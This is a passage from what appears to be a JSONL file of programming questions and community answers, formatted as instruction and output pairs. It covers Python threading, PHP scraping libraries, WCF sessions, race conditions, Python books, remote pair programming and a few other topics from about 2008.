string replacement!", "output": "In theory, something like eval ('function(){' + code + '}()'); could work (that syntax fails though).  Even if that did work, it would still be sort of ghetto to be calling an eval through a select onchange.  Another solution would be to somehow get Rails to inject the onsubmit code into the onchange field of the select tag, but I'm not sure if there's a way to do that.  ActionView has link_to_remote, but there's no obvious helper to generate the same code in the onchange field."}
{"instruction": "A reliable coder friend told me that Python's current multi-threading implementation is seriously buggy - enough to avoid using altogether.  What can said about this rumor?", "output": "Python threads are good for concurrent I/O programming. Threads are swapped out of the CPU as soon as they block waiting for input from file, network, etc. This allows other Python threads to use the CPU while others wait. This would allow you to write a multi-threaded web server or web crawler, for example.\nHowever, Python threads are serialized by the GIL when they enter interpreter core. This means that if two threads are crunching numbers, only one can run at any given moment. It also means that you can't take advantage of multi-core or multi-processor architectures.\nThere are solutions like running multiple Python interpreters concurrently, using a C based threading library. This is not for the faint of heart and the benefits might not be worth the trouble. Let's hope for an all Python solution in a future release."}
{"instruction": "How do you turn a Visual Studio build that you'd perform in the IDE into a script that you can run from the command line?", "output": "With VS2008 you can do this:\ndevenv solution.sln /build configuration"}
{"instruction": "I'm working on mac OS x 10.4. I have a subversion repository stored on an external drive connected via USB. I created a new python project in Eclipse (using the PyDev plugin). When I use right click Team->Share Project to set up a new prject with subversion, I get the following error:\nError while creating module: org.tigris.subversion.javahl.ClientException: Couldn't open a repository\nsvn:  Unable to open ra_local session to URL\nsvn: Unable to open repository 'file:///Volumes/svn-repos/Palindrome/Palindrome'\nThe subversion repository has the following permisions:\ndrwxrwxrwx     9 cameronl  cameronl   306 Aug 23 10:08 svn-repos\nThe external drive is formatted as Mac OS extended.\nI'm completely stumped. Anybody have any suggestions?", "output": "Try adding the repository first using the \"SVN Repository Exploring\" perspective (Window > Open Perspective > Other... > SVN Repository Exploring).\nMake sure that the URL you are using points to the correct directory, which typically contains these default repository files:\nconf/  dav/  db/  format  hooks/  locks/  README.txt\n\nHope this helps."}
{"instruction": "A reliable coder friend told me that Python's current multi-threading implementation is seriously buggy - enough to avoid using altogether.  What can said about this rumor?", "output": "The GIL (Global Interpreter Lock) might be a problem, but the API is quite OK. Try out the excellent processing module, which implements the Threading API for separate processes. I am using that right now (albeit on OS X, have yet to do some testing on Windows) and am really impressed. The Queue class is really saving my bacon in terms of managing complexity!\nEDIT: it seemes the processing module is being included in the standard library as of version 2.6 (import multiprocessing). Joy!"}
{"instruction": "I've been doing some html scraping in PHP using regular expressions.  This works, but the result is finicky and fragile.  Has anyone used any packages that provide a more robust solution?  A config driven solution would be ideal, but I'm not picky.", "output": "I would recomend PHP Simple HTML DOM Parser after you have scraped the HTML from the page. It supports invalid HTML, and provides a very easy way to handle HTML elements."}
{"instruction": "For various reasons calling System.exit is frowned upon when writing Java Applications, so how can I notify the calling process that not everything is going according to plan?\nEdit: The 1 is a standin for any non-zero exit code.", "output": "I think throwing an exception is what you should do when something goes wrong. This way, if your application is not running as a stand-alone app the caller can react to it and has some information about what went wrong. It is also easier for debugging purposes because you as well get a better idea about what went wrong when you see a stack trace.\nOne important thing to note is that when the exception reaches the top level and therefore causes the VM to quit the VM returns a return code of 1, therefore outside applications that use the return code see that something went wrong.\nThe only case where I think System.exit() makes sense is when your app is meant to be called by applications which are not Java and therefore have to use return codes to see if your app worked or not and you want those applications to have a chance to react differently on different things going wrong, i.e. you need different return codes."}
{"instruction": "I've been doing some html scraping in PHP using regular expressions.  This works, but the result is finicky and fragile.  Has anyone used any packages that provide a more robust solution?  A config driven solution would be ideal, but I'm not picky.", "output": "If the page you're scraping is valid X(HT)ML, then any of PHP's built-in XML parsers will do. \nI haven't had much success with PHP libraries for scraping. If you're adventurous though, you can try simplehtmldom. I'd recommend Hpricot for Ruby or Beautiful Soup for Python, which are both excellent parsers for HTML."}
{"instruction": "I've been doing some html scraping in PHP using regular expressions.  This works, but the result is finicky and fragile.  Has anyone used any packages that provide a more robust solution?  A config driven solution would be ideal, but I'm not picky.", "output": "I've had very good with results with the Simple Html DOM Parser mentioned above as well. And then there's the \u00a0tidy Extension for PHP as well which works really well too."}
{"instruction": "What is the best approach to make sure you only need to authenticate once when using an API built on WCF?\nMy current bindings and behaviors are listed below\n\t<bindings>\n\t\t<wsHttpBinding>\n\t\t\t<binding name=\"wsHttp\">\n\t\t\t\t<security mode=\"TransportWithMessageCredential\">\n\t\t\t\t\t<transport/>\n\t\t\t\t\t<message clientCredentialType=\"UserName\" negotiateServiceCredential=\"false\" establishSecurityContext=\"true\"/>\n\t\t\t\t</security>\n\t\t\t</binding>\n\t\t</wsHttpBinding>\n\t</bindings>\n\t<behaviors>\n\t\t<serviceBehaviors>\n\t\t\t<behavior name=\"NorthwindBehavior\">\n\t\t\t\t<serviceMetadata httpGetEnabled=\"true\"/>\n\t\t\t\t<serviceAuthorization principalPermissionMode=\"UseAspNetRoles\"/>\n\t\t\t\t<serviceCredentials>\n\t\t\t\t\t<userNameAuthentication userNamePasswordValidationMode=\"MembershipProvider\"/>\n\t\t\t\t</serviceCredentials>\n\t\t\t</behavior>\n\t\t</serviceBehaviors>\n\t</behaviors>\n\nNext is what I am using in my client app to authenticate (currently I must do this everytime I want to make a call into WCF)\nDim client As ProductServiceClient = New ProductServiceClient(\"wsHttpProductService\")\nclient.ClientCredentials.UserName.UserName = \"foo\"\nclient.ClientCredentials.UserName.Password = \"bar\"\nDim ProductList As List(Of Product) = client.GetProducts()\n\nWhat I would like to do is auth w/ the API once using these credentials, then get some type of token for the period of time my client application is using the web service project.  I thought establishsecuritycontext=true did this for me?", "output": "While I hate to give an answer I'm not 100% certain of, the lack of responses so far makes me think a potentially correct answer might be okay in this case.\nAs far as I'm aware there isn't the kind of session token mechanism you're looking for out-of-the-box with WCF which means you're going to have to do some heavy lifting to get things working in the way you want. I should make it clear there is a session mechanism in WCF but it's focused on guaranteeing message orders and is not the ideal tool for creating an authentication session.\nI just finished working on a project where we implemented our own session mechanism to handle all manner of legacy SOAP stacks, but I believe the recommended way to implement authenticated sessions is to use a Secure Token Service (STS) like Pablo Cibraro's.\nIf you want more details please shout, but I suspect Pablo's blog will have more than enough info for you to steam ahead."}
{"instruction": "Which is better to use in PHP, a 2D array or a class? I've included an example of what I mean by this.\n// Using a class\nclass someClass\n{\n    public  $name;\n    public  $height;\n    public  $weight;\n\n    function __construct($name, $height, $weight)\n    {\n        $this -> name       = $name;\n        $this -> height = $height;\n        $this -> weight = $weight;\n    }\n}\n\n$classArray[1] = new someClass('Bob', 10, 20);\n$classArray[2] = new someClass('Fred', 15, 10);\n$classArray[3] = new someClass('Ned', 25, 30);\n\n\n// Using a 2D array\n$normalArray[1]['name'] = 'Bob';\n$normalArray[1]['height']   = 10;\n$normalArray[1]['weight']   = 20;\n\n$normalArray[2]['name'] = 'Fred';\n$normalArray[2]['height']   = 15;\n$normalArray[2]['weight']   = 10;\n\n$normalArray[3]['name'] = 'Ned';\n$normalArray[3]['height']   = 25;\n$normalArray[3]['weight']   = 30;\n\n\nAssuming that somebody doesn't come out and show that classes are too slow, it looks like class wins.\nI've not idea which answer I should accept to I've just upvoted all of them.\n\nAnd I have now written two near identical pages, one using the 2D array (written before this question was posted) and now one using a class and I must say that the class produces much nicer code. I have no idea how much overhead is going to be generated but I doubt it will rival the improvement to the code itself.\nThank you for helping to make me a better programmer.", "output": "Teifion, if you use classes as a mere replacement for arrays, you are nowhere near OOP. The essence of OOP is that objects have knowledge and responsibility, can actually do things and cooperate with other classes. Your objects have knowledge only and can't do anything else than idly exist, however they seem to be good candidates for persistence providers (objects that know how to store/retrieve themselves into/from database).\nDon't worry about performance, too. Objects in PHP are fast and lightweight and performance in general is much overrated. It's cheaper to save your time as a programmer using the right approach than to save microseconds in your program with some obscure, hard to debug and fix piece of code."}
{"instruction": "I've been doing some html scraping in PHP using regular expressions.  This works, but the result is finicky and fragile.  Has anyone used any packages that provide a more robust solution?  A config driven solution would be ideal, but I'm not picky.", "output": "I had some fun working with htmlSQL, which is not so much a high end solution, but really simple to work with."}
{"instruction": "I have only just started received the following error in my windows forms application under dot net 2 framework on windows 2000 when using System.DirectoryServices.\n    {System.Runtime.InteropServices.COMException}\nSystem.Runtime.InteropServices.COMException: {\"Library not registered.\"}\n_className: Nothing\n_COMPlusExceptionCode: -532459699\n_data: Nothing\n_dynamicMethods: Nothing\n_exceptionMethod: Nothing\n_exceptionMethodString: Nothing\n_helpURL: Nothing\n_HResult: -2147319779\n_innerException: Nothing\n_message: \"Library not registered.\"\n_remoteStackIndex: 0\n_remoteStackTraceString: Nothing\n_source: Nothing\n_stackTrace: {System.Array}\n_stackTraceString: Nothing\n_xcode: -532459699\n_xptrs: 0\nSource: \"System.DirectoryServices\"\nStackTrace: \"   at System.DirectoryServices.DirectoryEntry.Bind(Boolean throwIfFail)\n\nat System.DirectoryServices.DirectoryEntry.Bind()\n   at System.DirectoryServices.DirectoryEntry.get_AdsObject()\n   at System.DirectoryServices.DirectorySearcher.FindAll(Boolean findMoreThanOne)\n   at System.DirectoryServices.DirectorySearcher.FindAll()\nI have re-installed the framework and re-registered activeds.dll however this has not resolved the issue. I am guessing I need to find another dll and re-register it however it is not clear which dll this would be.", "output": "Having used Reflector to have a quick peak at the Directory Services code, it looks like your Active Directory Service Interfaces installation might be kaput.\nYou can download version 2.5 from Technet although I'm not sure if it's the latest version or if it works with Windows 2000."}
{"instruction": "Has the introduction of the .net framework made raw programming in COM and DCOM redundant ? \n(Except for using some COM+ services, e.g. for transaction management through the System.EnterpriseServices namespace)", "output": "Not yet, but I'd say in the long term, it aims to. Obviously there will always be a place for the lower levels, but from what I understand of Microsoft's strategy, the move is towards replacing as much with managed code as possible."}
{"instruction": "Has the introduction of the .net framework made raw programming in COM and DCOM redundant ? \n(Except for using some COM+ services, e.g. for transaction management through the System.EnterpriseServices namespace)", "output": ".NET has been deliberately designed to replace COM (and, consequently, DLL Hell) so while .NET applications still can access COM components, all new development are encouraged to move to .NET except if you have a very good reason to stick with COM."}
{"instruction": "Has the introduction of the .net framework made raw programming in COM and DCOM redundant ? \n(Except for using some COM+ services, e.g. for transaction management through the System.EnterpriseServices namespace)", "output": "Not yet, because the OS is still unmanaged.\nIf MS finally do what their labs have been talking about for years and produce a fully managed OS then it will.\nThat OS won't be backwards compatible though. They would have to produce managed versions of Office, IE, etc first. They will have to produce a virtual machine to run unmanaged apps.\nThe pain would be something similar to the move from Mac OS9 to OSX."}
{"instruction": "Has the introduction of the .net framework made raw programming in COM and DCOM redundant ? \n(Except for using some COM+ services, e.g. for transaction management through the System.EnterpriseServices namespace)", "output": "COM was the last major technology that MS actually dogfooded.  MS are continuing to build new APIs that depend on COM; for example, Vista's new Media Foundation (a kind of successor to DirectShow, which was also COM-based) is a COM API.  So is Direct3D10 (and I would assume D3D11).  I don't think it's going to disappear any time soon, and for a lot of Windows programming tasks it's not at all redundant."}
{"instruction": "The company I work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a CMS they purchased (sitecore).  I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. \r\nMy question is if anyone has had issues working with Community Server, skinning it and extending it?\r\nI wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.\nedit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.\nanother edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.  ExpressionEngine looks promising, will try it out on my personal box.", "output": "You can also take a look at Telligent Graffiti CMS.\nhttp://graffiticms.com/\nIt supports multiple blogs and authors.\nUpdate: It's now open source and available at http://graffiticms.codeplex.com/"}
{"instruction": "Since there are no header sections for user controls in asp.net, user controls have no way of knowing about stylesheet files. So css classes in the user controls are not recognized by visual studio and produces warnings. How can I make a user control know that it will relate to a css class, so if it is warning me about a non-existing css class, it means that the class really do not exist?\nEdit: Or should I go for a different design like exposing css classes as properties like \"HeaderStyle-CssClass\" of GridView?", "output": "If you are creating composite UserControl, then you can set the CSSClass property on the child controls..\nIf not, then you need to expose properties that are either of the Style type, or (as I often do) string properties that apply CSS at the render type (i.e. take them properties and add a style attribute to the HTML tags when rendering)."}
{"instruction": "Since there are no header sections for user controls in asp.net, user controls have no way of knowing about stylesheet files. So css classes in the user controls are not recognized by visual studio and produces warnings. How can I make a user control know that it will relate to a css class, so if it is warning me about a non-existing css class, it means that the class really do not exist?\nEdit: Or should I go for a different design like exposing css classes as properties like \"HeaderStyle-CssClass\" of GridView?", "output": "Here's what I did:\n<link rel=\"Stylesheet\" type=\"text/css\" href=\"Stylesheet.css\" id=\"style\" runat=\"server\" visible=\"false\" />\n\nIt fools Visual Studio into thinking you've added a stylesheet to the page but it doesn't get rendered.\n\nHere's an even more concise way to do this with multiple references;\n<% if (false) { %>\n    <link rel=\"Stylesheet\" type=\"text/css\" href=\"Stylesheet.css\" />\n    <script type=\"text/javascript\" src=\"js/jquery-1.2.6.js\" />\n<% } %>\n\nAs seen in this blog post from Phil Haack."}
{"instruction": "SHA Hash functions", "output": "require 'digest/sha1'\nDigest::SHA1.hexdigest 'foo'"}
{"instruction": "When writing multi-threaded applications, one of the most common problems experienced are race conditions.  \nMy questions to the community are:\nWhat is a race condition? How do you detect them? How do you handle them? Finally, how do you prevent them from occurring?", "output": "A race condition is a kind of bug, that happens only with certain temporal conditions.\nExample:\nImagine you have two threads, A and B.\nIn Thread A:\nif( object.a != 0 )\n    object.avg = total / object.a\n\nIn Thread B:\nobject.a = 0\n\nIf thread A is preempted just after having check that object.a is not null, B will do a = 0, and when thread A will gain the processor, it will do a \"divide by zero\". \nThis bug only happen when thread A is preempted just after the if statement, it's very rare, but it can happen."}
{"instruction": "When writing multi-threaded applications, one of the most common problems experienced are race conditions.  \nMy questions to the community are:\nWhat is a race condition? How do you detect them? How do you handle them? Finally, how do you prevent them from occurring?", "output": "A race condition occurs when two or more threads can access shared data and they try to change it at the same time. Because the thread scheduling algorithm can swap between threads at any time, you don't know the order in which the threads will attempt to access the shared data. Therefore, the result of the change in data is dependent on the thread scheduling algorithm, i.e. both threads are \"racing\" to access/change the data. \nProblems often occur when one thread does a \"check-then-act\" (e.g. \"check\" if the value is X, then \"act\" to do something that depends on the value being X) and another thread does something to the value in between the \"check\" and the \"act\". E.g:\nif (x == 5) // The \"Check\"\n{\n   y = x * 2; // The \"Act\"\n\n   // If another thread changed x in between \"if (x == 5)\" and \"y = x * 2\" above,\n   // y will not be equal to 10.\n}\n\nThe point being, y could be 10, or it could be anything, depending on whether another thread changed x in between the check and act. You have no real way of knowing.\nIn order to prevent race conditions from occurring, you would typically put a lock around the shared data to ensure only one thread can access the data at a time. This would mean something like this:\n// Obtain lock for x\nif (x == 5)\n{\n   y = x * 2; // Now, nothing can change x until the lock is released. \n              // Therefore y = 10\n}\n// release lock for x"}
{"instruction": "When writing multi-threaded applications, one of the most common problems experienced are race conditions.  \nMy questions to the community are:\nWhat is a race condition? How do you detect them? How do you handle them? Finally, how do you prevent them from occurring?", "output": "A race condition is a situation on concurrent programming where two concurrent threads or processes and the resulting final state depends on who gets the resource first."}
{"instruction": "When writing multi-threaded applications, one of the most common problems experienced are race conditions.  \nMy questions to the community are:\nWhat is a race condition? How do you detect them? How do you handle them? Finally, how do you prevent them from occurring?", "output": "Race conditions occur in multi-threaded applications or multi-process systems.  A race condition, at its most basic, is anything that makes the assumption that two things not in the same thread or process will happen in a particular order, without taking steps to ensure that they do.  This happens commonly when two threads are passing messages by setting and checking member variables of a class both can access.  There's almost always a race condition when one thread calls sleep to give another thread time to finish a task (unless that sleep is in a loop, with some checking mechanism).\nTools for preventing race conditions are dependent on the language and OS, but some comon ones are mutexes, critical sections, and signals.  Mutexes are good when you want to make sure you're the only one doing something.  Signals are good when you want to make sure someone else has finished doing something.  Minimizing shared resources can also help prevent unexpected behaviors\nDetecting race conditions can be difficult, but there are a couple signs.  Code which relies heavily on sleeps is prone to race conditions, so first check for calls to sleep in the affected code.  Adding particularly long sleeps can also be used for debugging to try and force a particular order of events.  This can be useful for reproducing the behavior, seeing if you can make it disappear by changing the timing of things, and for testing solutions put in place.  The sleeps should be removed after debugging.\nThe signature sign that one has a race condition though, is if there's an issue that only occurs intermittently on some machines.  Common bugs would be crashes and deadlocks.  With logging, you should be able to find the affected area and work back from there."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "I expect that Learning Python is useful, and quick to read."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "I found Learning Python really good. It's pretty long (>700 pages) but extremely readable and you can rip through it very quickly given you're a quick study :-)"}
{"instruction": "We have a team of about 7 engineers, whom I supervise. We do not have a formal office where we all work. Instead, a handful are located outside of our city, while the rest of us are scattered around the Bay Area.\nQuite frequently, I find myself attempting to teach concepts like TDD or refactoring to some of our more junior (or not) developers. The best technique I know is pair programming, where you both sit at the same computer and work on a problem together. Since we are not in the same place most of the time, the only option is to use some kind of screen sharing and Skype to have one of us \"drive\" while the other consults, and then switch.\nMy question is has anyone tried this \"virtual\" pair programming, and did you find it at all useful?", "output": "Trying to pair program remotely probably won't be as useful as doing it in person, but you can of course do it using collaborative editors as SubEthaEdit in OS X."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "I loved Dive Into Python, especially if you're a quick study.  The beginning basics are all covered (and may move slowly for you), but the latter few chapters are great learning tools.\nPlus, Pilgrim is a pretty good writer."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "Since you're already familiar with other languages and a quick study, I'd recommend Python in a Nutshell by Alex Martelli, very concise and also useful later on for reference."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "Two good online-books, that also describes the basics of the environment is diveintopython.net and  the \"official\" tutorial."}
{"instruction": "When writing multi-threaded applications, one of the most common problems experienced are race conditions.  \nMy questions to the community are:\nWhat is a race condition? How do you detect them? How do you handle them? Finally, how do you prevent them from occurring?", "output": "A sort-of-canonical definition is \"when two threads access the same location in memory at the same time, and at least one of the accesses is a write.\" In the situation the \"reader\" thread may get the old value or the new value, depending on which thread \"wins the race.\" This is not always a bug\u2014in fact, some really hairy low-level algorithms do this on purpose\u2014but it should generally be avoided. @Steve Gury give's a good example of when it might be a problem."}
{"instruction": "We have a team of about 7 engineers, whom I supervise. We do not have a formal office where we all work. Instead, a handful are located outside of our city, while the rest of us are scattered around the Bay Area.\nQuite frequently, I find myself attempting to teach concepts like TDD or refactoring to some of our more junior (or not) developers. The best technique I know is pair programming, where you both sit at the same computer and work on a problem together. Since we are not in the same place most of the time, the only option is to use some kind of screen sharing and Skype to have one of us \"drive\" while the other consults, and then switch.\nMy question is has anyone tried this \"virtual\" pair programming, and did you find it at all useful?", "output": "We've been using the new ECF features in Eclipse 3.4 (Ganymede) and we like it. We're not actually remote from each other except when one of us is working at home but ECF lets you edit the same file and also has an IM window for chatting. If you use Skype, so much the better.\nThere's a good screencast on Vimeo of the screen sharing that really made us excited about it."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "Dive Into Python is an excellent book geared toward programmers wanting to pick up Python.  The best part is that it's freely available online.  I started learning a little Python a few months ago and I've worked through about half of the book.  It's a very comprehensive tool that's good for learning the language and also for a reference down the road.\nEdit: Kamens is a faster typer than I am."}
{"instruction": "We have a team of about 7 engineers, whom I supervise. We do not have a formal office where we all work. Instead, a handful are located outside of our city, while the rest of us are scattered around the Bay Area.\nQuite frequently, I find myself attempting to teach concepts like TDD or refactoring to some of our more junior (or not) developers. The best technique I know is pair programming, where you both sit at the same computer and work on a problem together. Since we are not in the same place most of the time, the only option is to use some kind of screen sharing and Skype to have one of us \"drive\" while the other consults, and then switch.\nMy question is has anyone tried this \"virtual\" pair programming, and did you find it at all useful?", "output": "In my current job, I've worked with another developer who was in another location. While we consulted quite often with each other through phone calls (headsets are a huge plus!) and screen sharing, the real 'together work' (including some real pair programming) was much more effective when I visited his location (did that twice for a whole week, and these weeks were very intense).\nThe main problem with screen sharing is that you never know who is going to move the mouse,... (for example to point at something on the screen).\nOn that project, we ended up dividing the work into 2 sub-projects, and got together (meaning: travelling) to plug them together."}
{"instruction": "I've developed my own delivery extension for Reporting Services 2005, to integrate this with our SaaS marketing solution.\nIt takes the subscription, and takes a snapshot of the report with a custom set of parameters. It then renders the report, sends an e-mail with a link and the report attached as XLS.\nEverything works fine, until mail delivery...\nHere's my code for sending e-mail:\n public static List<string> SendMail(SubscriptionData data, Stream reportStream, string reportName, string smptServerHostname, int smtpServerPort)\n{\n  List<string> failedRecipients = new List<string>();\n\n  MailMessage emailMessage = new MailMessage(data.ReplyTo, data.To);\n  emailMessage.Priority = data.Priority;\n  emailMessage.Subject = data.Subject;\n  emailMessage.IsBodyHtml = false;\n  emailMessage.Body = data.Comment;\n\n  if (reportStream != null)\n  {\n    Attachment reportAttachment = new Attachment(reportStream, reportName);\n    emailMessage.Attachments.Add(reportAttachment);\n    reportStream.Dispose();\n  }\n\n  try\n  {\n    SmtpClient smtp = new SmtpClient(smptServerHostname, smtpServerPort);\n\n    // Send the MailMessage\n    smtp.Send(emailMessage);\n  }\n  catch (SmtpFailedRecipientsException ex)\n  {\n    // Delivery failed for the recipient. Add the e-mail address to the failedRecipients List\n    failedRecipients.Add(ex.FailedRecipient);\n  }\n  catch (SmtpFailedRecipientException ex)\n  {\n    // Delivery failed for the recipient. Add the e-mail address to the failedRecipients List\n    failedRecipients.Add(ex.FailedRecipient);\n  }\n  catch (SmtpException ex)\n  {\n    throw ex;\n  }\n  catch (Exception ex)\n  {\n    throw ex;\n  }\n\n  // Return the List of failed recipient e-mail addresses, so the client can maintain its list.\n  return failedRecipients;\n}\n\nValues for SmtpServerHostname is localhost, and port is 25.\nI veryfied that I can actually send mail, by using Telnet. And it works.\nHere's the error message I get from SSRS:\nReportingServicesService!notification!4!08/28/2008-11:26:17:: Notification 6ab32b8d-296e-47a2-8d96-09e81222985c completed.  Success: False, Status: Exception Message: Failure sending mail. Stacktrace:    at MyDeliveryExtension.MailDelivery.SendMail(SubscriptionData data, Stream reportStream, String reportName, String smptServerHostname, Int32 smtpServerPort) in C:\\inetpub\\wwwroot\\CustomReporting\\MyDeliveryExtension\\MailDelivery.cs:line 48\n   at MyDeliveryExtension.MyDelivery.Deliver(Notification notification) in C:\\inetpub\\wwwroot\\CustomReporting\\MyDeliveryExtension\\MyDelivery.cs:line 153, DeliveryExtension: My Delivery, Report: Clicks Development, Attempt 1\nReportingServicesService!dbpolling!4!08/28/2008-11:26:17:: NotificationPolling finished processing item 6ab32b8d-296e-47a2-8d96-09e81222985c\nCould this have something to do with Trust/Code Access Security?\nMy delivery extension is granted full trust in rssrvpolicy.config:\n   <CodeGroup \n    class=\"UnionCodeGroup\"\n    version=\"1\"\n    PermissionSetName=\"FullTrust\"\n    Name=\"MyDelivery_CodeGroup\"\n    Description=\"Code group for MyDelivery extension\">\n    <IMembershipCondition class=\"UrlMembershipCondition\" version=\"1\" Url=\"C:\\Program Files\\Microsoft SQL Server\\MSSQL.2\\Reporting Services\\ReportServer\\bin\\MyDeliveryExtension.dll\" />\n   </CodeGroup>\n\nCould trust be an issue here?\nAnother theory: SQL Server and SSRS was installed in the security context of Local System. Am I right, or is this service account restricted access to any network resource? Even its own SMTP Server?\nI tried changing all SQL Server Services logons to Administrator - but still without any success.\nI also tried logging onto the SMTP server in my code, by proviiding: NetworkCredential(\"Administrator\", \"password\") and also NetworkCredential(\"Administrator\", \"password\", \"MyRepServer\")\nCan anyone help here, please?", "output": "That's why you have to avoid:\ncatch (Exception ex)\n{\n    throw ex;\n}\n\nAs that basically cloaks your exception in a new one.\nIf you use:\ncatch (Exception ex)\n{\n    throw; //note: no ex\n}\n\nIt keeps the original exception and stack trace."}
{"instruction": "We have a team of about 7 engineers, whom I supervise. We do not have a formal office where we all work. Instead, a handful are located outside of our city, while the rest of us are scattered around the Bay Area.\nQuite frequently, I find myself attempting to teach concepts like TDD or refactoring to some of our more junior (or not) developers. The best technique I know is pair programming, where you both sit at the same computer and work on a problem together. Since we are not in the same place most of the time, the only option is to use some kind of screen sharing and Skype to have one of us \"drive\" while the other consults, and then switch.\nMy question is has anyone tried this \"virtual\" pair programming, and did you find it at all useful?", "output": "I know Netbeans has a plugin for \"Developer Collaboration\" (flash demo), which is basically like multiplayer-programming.  Any changes you make in your local file are replicated almost immediately to the other party.  It's pretty cool, but it's been a while since I've played with it, and I've never used it for a real project.  There is a chat window but you're probably better off still talking on the phone or using skype."}
{"instruction": "When writing multi-threaded applications, one of the most common problems experienced are race conditions.  \nMy questions to the community are:\nWhat is a race condition? How do you detect them? How do you handle them? Finally, how do you prevent them from occurring?", "output": "A \"race condition\" exists when multithreaded (or otherwise parallel) code that would access a shared resource could do so in such a way as to cause unexpected results.\nTake this example:\nfor ( int i = 0; i < 10000000; i++ )\n{\n   x = x + 1; \n}\n\nIf you had 5 threads executing this code at once, the value of x WOULD NOT end up being 50,000,000.  It would in fact vary with each run.\nThis is because, in order for each thread to increment the value of x, they have to do the following: (simplified, obviously)\n\nRetrieve the value of x\nAdd 1 to this value\nStore this value to x\n\nAny thread can be at any step in this process at any time, and they can step on each other when a shared resource is involved.  The state of x can be changed by another thread during the time between x is being read and when it is written back.\nLet's say a thread retrieves the value of x, but hasn't stored it yet.  Another thread can also retrieve the same value of x (because no thread has changed it yet) and then they would both be storing the same value (x+1) back in x!\nExample:\n\nThread 1: reads x, value is 7\nThread 1: add 1 to x, value is now 8\nThread 2: reads x, value is 7\nThread 1: stores 8 in x\nThread 2: adds 1 to x, value is now 8\nThread 2: stores 8 in x\n\nRace conditions can be avoided by employing some sort of locking mechanism before the code that accesses the shared resource:\nfor ( int i = 0; i < 10000000; i++ )\n{\n   //lock x\n   x = x + 1; \n   //unlock x\n}\n\nHere, the answer comes out as 50,000,000 every time.\nFor more on locking, search for: mutex, semaphore, critical section, shared resource."}
{"instruction": "A reliable coder friend told me that Python's current multi-threading implementation is seriously buggy - enough to avoid using altogether.  What can said about this rumor?", "output": "The standard implementation of Python (generally known as CPython as it is written in C) uses OS threads, but since there is the Global Interpreter Lock, only one thread at a time is allowed to run Python code.  But within those limitations, the threading libraries are robust and widely used.\nIf you want to be able to use multiple CPU cores, there are a few options.  One is to use multiple python interpreters concurrently, as mentioned by others.  Another option is to use a different implementation of Python that does not use a GIL.  The two main options are Jython and IronPython.\nJython is written in Java, and is now fairly mature, though some incompatibilities remain.  For example, the web framework Django does not run perfectly yet, but is getting closer all the time.  Jython is great for thread safety, comes out better in benchmarks and has a cheeky message for those wanting the GIL.\nIronPython uses the .NET framework and is written in C#.  Compatibility is reaching the stage where Django can run on IronPython (at least as a demo) and there are guides to using threads in IronPython."}
{"instruction": "The datepicker function only works on the first input box that is created.\nI'm trying to duplicate a datepicker by cloning the div that is containing it.\n<a href=\"#\" id=\"dupMe\">click</a>\n<div id=\"template\">\ninput-text <input type=\"text\" value=\"text1\" id=\"txt\" />\ndate time picker <input type=\"text\" id=\"example\" value=\"(add date)\" />\n</div>\n\nTo initialize the datepicker, according to the jQuery UI documentation I only have to do $('#example').datepicker(); and it does work, but only on the first datepicker that is created.\nThe code to duplicate the div is the following:\n$(\"a#dupMe\").click(function(event){\n    event.preventDefault();\n    i++;\n    var a = $(\"#template\").clone(true).insertBefore(\"#template\").hide().fadeIn(1000);\n    a.find(\"input#txt\").attr('value', i);\n    a.find(\"input#example\").datepicker();\n});\n\nThe strangest thing is that on the document.ready I have:\n$('#template #example').datepicker();\n$(\"#template #txt\").click(function() { alert($(this).val()); });\n\nand if I click on the #txt it always works.", "output": "I use a CSS class instead:\n<input type=\"text\" id=\"BeginDate\" class=\"calendar\" />\n<input type=\"text\" id=\"EndDate\" class=\"calendar\" />\n\nThen, in your document.ready function:\n$('.calendar').datepicker();\n\nUsing it that way for multiple calendar fields works for me."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "Learning Python is how I learned the language.  It's a quick read, and very well organized around fundamental concepts."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "Python Pocket Reference.\nI have both Learning Python & Programming Python and I almost always go to the Pocket Reference first."}
